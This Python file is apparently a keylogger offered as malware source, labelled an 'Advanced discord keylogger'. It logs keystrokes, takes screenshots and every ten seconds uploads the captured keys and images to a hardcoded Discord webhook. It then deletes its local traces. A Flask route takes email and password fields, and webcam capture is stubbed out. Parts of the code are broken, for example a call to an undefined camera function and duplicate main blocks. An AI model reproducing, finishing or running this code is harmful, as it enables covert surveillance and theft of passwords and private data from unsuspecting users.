# external libraries
from pynput import keyboard
from pynput.keyboard import Listener
from flask import Flask, request, render_template
import time
import pyautogui
import pyscreeze
import cv2
import requests
import os 
import shutil

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
   email = request.form['email']
   password = request.form['password']
# handling the data
   #return f'email: {email}, password: {password}
   
# Function to log keystrokes
def log_keystroke(key):
    key = str(key).replace("'", "") # Clean up key format
    with open("log.txt", "a") as log_file:
        log_file.write(key + "\n")

# Function to start listening to keystrokes
def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    print("[+] Keylogger is running... (press CTRL + C to stop)")
    start_logging()

if __name__ == '__main__':
    app.run(debug=True)

# Housekeeping
WEBHOOK_URL = "https://discord.com/api/webhooks/1567398573329354873/Z7NoiUsGtiQHRFmZ_ukvpExcok9MCf855e4lmmi-tZWvpJ5YsPtH6V-wSsrz6Wo0fj3a"
save_dir = "output"
os.makedirs(save_dir, exist_ok=True)
KEYLOG_FILE = os.path.join(save_dir, "keylog.txt")
    
# Main keystroke logging function
def on_press(key):
    try:
        k = key.char  # single-char keys
    except:
        k = str(key)  # other keys
    with open(KEYLOG_FILE, "a") as f:
        f.write(k)

listener = keyboard.Listener(on_press=on_press)
listener.start()

#screenshot function
def take_screenshot():
    filename = os.path.join(save_dir, "screenshot.png")
    pyautogui.screenshot(filename)
    return filename

# webcam capture function
#def capture_webcam():
   #filename = os.path.join(save_dir, "camera.png")
    #cap = cv2.VideoCapture(0)
    #ret, frame = cap.read()
    #if ret:
        #cv2.imwrite(filename, frame)
    #cap.release()
    #return filename

#send media and keystrokes to discord
def send_to_discord():
    # read keylogs
    keylog_data = ""
    if os.path.exists(KEYLOG_FILE):
        with open(KEYLOG_FILE, "r") as f:
            keylog_data = f.read()
        open(KEYLOG_FILE, "w").close()  # clear the file after reading

    # capture media
    screenshot = take_screenshot()
    camera = take_camera_photo()
    media_files = [screenshot, camera]

    # send keylogs
    requests.post(WEBHOOK_URL, data={"content": f"# keylogs:\n```{keylog_data}```"})

    # send images 
    for f in media_files:
        with open(f, "rb") as file_obj:
            requests.post(WEBHOOK_URL, files={"files": file_obj})

   #cleanup
    for f in os.listdir(save_dir):
        file_path = os.path.join(save_dir, f)
        try:
            if os.path.isfile(file_path):
                os.remove(file_path)
        except Exception as e:
            print(f"Error deleting file {file_path}: {e}")

print("[*] Advanced discord keylogger is running...")


while True:
    time.sleep(10)  # wait for 30 seconds
    send_to_discord()